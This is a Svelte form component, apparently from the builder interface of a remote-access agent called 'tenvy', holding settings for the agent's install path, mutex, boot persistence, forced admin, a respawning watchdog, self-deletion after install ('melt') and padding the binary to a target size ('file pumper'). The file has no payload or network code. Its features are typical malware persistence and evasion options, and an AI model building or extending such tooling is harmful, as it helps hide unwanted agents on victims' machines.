<script lang="ts">
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import {
		FILE_PUMPER_UNITS,
		INSTALLATION_PATH_PRESETS,
		type FilePumperUnit
	} from '../lib/constants.js';
	import { WandSparkles } from '@lucide/svelte';

	interface Props {
		installationPath: string;
		mutexName: string;
		meltAfterRun: boolean;
		startupOnBoot: boolean;
		developerMode: boolean;
		compressBinary: boolean;
		forceAdmin: boolean;
		watchdogEnabled: boolean;
		watchdogIntervalSeconds: string;
		enableFilePumper: boolean;
		filePumperTargetSize: string;
		filePumperUnit: FilePumperUnit;

		applyInstallationPreset: (value: string) => void;
		assignMutexName: () => void;
	}

	let {
		installationPath = $bindable(),
		mutexName = $bindable(),
		meltAfterRun = $bindable(),
		startupOnBoot = $bindable(),
		developerMode = $bindable(),
		compressBinary = $bindable(),
		forceAdmin = $bindable(),
		watchdogEnabled = $bindable(),
		watchdogIntervalSeconds = $bindable(),
		enableFilePumper = $bindable(),
		filePumperTargetSize = $bindable(),
		filePumperUnit = $bindable(),
		applyInstallationPreset,
		assignMutexName
	}: Props = $props();
</script>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Installation</h3>
		<p class="text-xs text-muted-foreground">
			Define where the agent writes itself and how instances coexist.
		</p>
	</div>

	<div class="space-y-6">
		<div class="grid gap-2">
			<Label for="path">Installation path</Label>
			<Input id="path" placeholder="/usr/local/bin/tenvy" bind:value={installationPath} />
			<div class="flex flex-wrap items-center gap-2 text-xs text-muted-foreground">
				<span class="font-medium text-muted-foreground/80">Quick fill:</span>
				{#each INSTALLATION_PATH_PRESETS as preset (preset.value)}
					<Button
						type="button"
						variant="ghost"
						size="sm"
						class="h-7 rounded-full border border-border/70 px-3 text-[0.65rem] font-semibold text-muted-foreground hover:bg-muted"
						onclick={() => applyInstallationPreset(preset.value)}
					>
						{preset.label}
					</Button>
				{/each}
			</div>
		</div>

		<div class="grid gap-2">
			<Label for="mutex">Mutex name</Label>
			<div class="flex flex-col gap-2 sm:flex-row sm:items-center">
				<Input
					id="mutex"
					placeholder="Ensures only a single instance can run"
					class="sm:flex-1"
					bind:value={mutexName}
				/>
				<Button
					type="button"
					variant="outline"
					size="sm"
					class="shrink-0"
					onclick={assignMutexName}
				>
					<WandSparkles class="h-4 w-4" />
					Generate
				</Button>
			</div>
			<p class="text-xs text-muted-foreground">
				Optional. Leave blank to allow multiple instances. Unsupported characters are replaced
				automatically.
			</p>
		</div>
	</div>
</section>

<section class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Persistence features</h3>
		<p class="text-xs text-muted-foreground">
			Toggle startup behavior, resilience, and binary padding options.
		</p>
	</div>

	<div class="grid gap-6 md:grid-cols-2 xl:grid-cols-3">
		<div
			class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
		>
			<div>
				<p class="text-sm font-medium">Melt after run</p>
				<p class="text-xs text-muted-foreground">
					Remove the staging binary after installation completes.
				</p>
			</div>
			<Switch bind:checked={meltAfterRun} aria-label="Toggle melt-after-run" />
		</div>

		<div
			class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
		>
			<div>
				<p class="text-sm font-medium">Startup on boot</p>
				<p class="text-xs text-muted-foreground">
					Persist the agent path so it can be launched automatically on boot.
				</p>
			</div>
			<Switch bind:checked={startupOnBoot} aria-label="Toggle startup persistence" />
		</div>

		<div
			class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
		>
			<div>
				<p class="text-sm font-medium">Developer mode</p>
				<p class="text-xs text-muted-foreground">
					Keep the console window visible to surface runtime logs and errors.
				</p>
			</div>
			<Switch bind:checked={developerMode} aria-label="Toggle developer mode" />
		</div>

		<div
			class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
		>
			<div>
				<p class="text-sm font-medium">Binary compression</p>
				<p class="text-xs text-muted-foreground">
					Strip debug symbols and compress the executable when possible.
				</p>
			</div>
			<Switch bind:checked={compressBinary} aria-label="Toggle binary compression" />
		</div>

		<div
			class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
		>
			<div>
				<p class="text-sm font-medium">Require administrator</p>
				<p class="text-xs text-muted-foreground">
					Abort launch unless elevated privileges are detected at runtime.
				</p>
			</div>
			<Switch bind:checked={forceAdmin} aria-label="Toggle admin requirement" />
		</div>

		<div
			class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
		>
			<div class="w-full">
				<p class="text-sm font-medium">Watchdog</p>
				<p class="text-xs text-muted-foreground">
					Respawn the agent if the process is terminated unexpectedly.
				</p>
				{#if watchdogEnabled}
					<div class="mt-3 grid gap-1 text-xs">
						<Label
							for="watchdog-interval"
							class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
						>
							Respawn delay (s)
						</Label>
						<Input
							id="watchdog-interval"
							class="h-8 text-xs"
							placeholder="60"
							bind:value={watchdogIntervalSeconds}
							inputmode="numeric"
						/>
					</div>
				{/if}
			</div>
			<Switch bind:checked={watchdogEnabled} aria-label="Toggle watchdog" />
		</div>

		<div
			class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
		>
			<div class="w-full">
				<p class="text-sm font-medium">File pumper</p>
				<p class="text-xs text-muted-foreground">
					Pad the binary with random data to reach a desired minimum size.
				</p>
				{#if enableFilePumper}
					<div class="mt-3 grid gap-3 text-xs sm:grid-cols-[minmax(0,1fr)_auto] sm:items-end">
						<div class="grid gap-1">
							<Label
								for="file-pumper-size"
								class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
							>
								Target size
							</Label>
							<Input
								id="file-pumper-size"
								class="h-8 text-xs"
								placeholder="500"
								bind:value={filePumperTargetSize}
								inputmode="numeric"
							/>
						</div>
						<div class="grid gap-1">
							<Label
								for="file-pumper-unit"
								class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
							>
								Unit
							</Label>
							<select
								id="file-pumper-unit"
								bind:value={filePumperUnit}
								class="flex h-8 w-full items-center justify-between rounded-md border border-input bg-background px-2 text-xs ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
							>
								{#each FILE_PUMPER_UNITS as unit (unit)}
									<option value={unit}>{unit}</option>
								{/each}
							</select>
						</div>
					</div>
				{/if}
			</div>
			<Switch bind:checked={enableFilePumper} aria-label="Toggle file pumper" />
		</div>
	</div>
</section>
